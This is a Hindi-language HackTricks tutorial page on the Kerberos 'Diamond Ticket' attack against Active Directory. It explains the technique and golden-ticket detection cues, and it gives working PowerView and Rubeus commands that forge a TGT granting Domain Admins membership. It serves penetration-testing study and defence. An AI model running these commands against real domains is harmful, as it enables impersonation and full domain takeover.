# डायमंड टिकट

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें**, तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** पर 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) को **फॉलो करें**.
* **अपनी हैकिंग ट्रिक्स साझा करें PRs जमा करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में.

</details>

## डायमंड टिकट

**गोल्डन टिकट की तरह**, डायमंड टिकट एक TGT है जिसका उपयोग **किसी भी सेवा तक किसी भी उपयोगकर्ता के रूप में पहुँचने के लिए** किया जा सकता है। एक गोल्डन टिकट पूरी तरह से ऑफलाइन बनाई जाती है, उस डोमेन के krbtgt हैश के साथ एन्क्रिप्ट की जाती है, और फिर उपयोग के लिए एक लॉगऑन सत्र में डाली जाती है। चूंकि डोमेन कंट्रोलर्स TGTs को ट्रैक नहीं करते हैं जिन्हें वे (या वे) वैध रूप से जारी करते हैं, वे खुशी-खुशी TGTs को स्वीकार कर लेंगे जो उसके अपने krbtgt हैश के साथ एन्क्रिप्ट किए गए हैं।

गोल्डन टिकट के उपयोग का पता लगाने के दो सामान्य तकनीकें हैं:

* TGS-REQs की तलाश करें जिनके पास कोई संबंधित AS-REQ नहीं है।
* TGTs की तलाश करें जिनमें मूर्खतापूर्ण मान होते हैं, जैसे कि Mimikatz का डिफ़ॉल्ट 10-वर्ष का जीवनकाल।

एक **डायमंड टिकट** एक वैध TGT के क्षेत्रों को **संशोधित करके** बनाई जाती है जिसे एक DC द्वारा जारी किया गया था। यह **TGT का अनुरोध करके**, डोमेन के krbtgt हैश के साथ उसे **डिक्रिप्ट करके**, टिकट के वांछित क्षेत्रों को **संशोधित करके**, फिर **उसे फिर से एन्क्रिप्ट करके** प्राप्त किया जाता है। यह गोल्डन टिकट की ऊपर बताई गई दो कमियों को **दूर करता है** क्योंकि:

* TGS-REQs के पास एक पूर्ववर्ती AS-REQ होगा।
* TGT को एक DC द्वारा जारी किया गया था जिसका मतलब है कि इसमें डोमेन की Kerberos नीति से सभी सही विवरण होंगे। भले ही इन्हें एक गोल्डन टिकट में सटीक रूप से नकली बनाया जा सकता है, यह अधिक जटिल है और गलतियों के लिए खुला है।
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
```markdown
<details>

<summary><strong>शून्य से नायक तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह में शामिल हों**](https://discord.gg/hRep4RUj7f) या [**telegram समूह**](https://t.me/peass) या **Twitter** 🐦 पर **मुझे फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके.

</details>
```
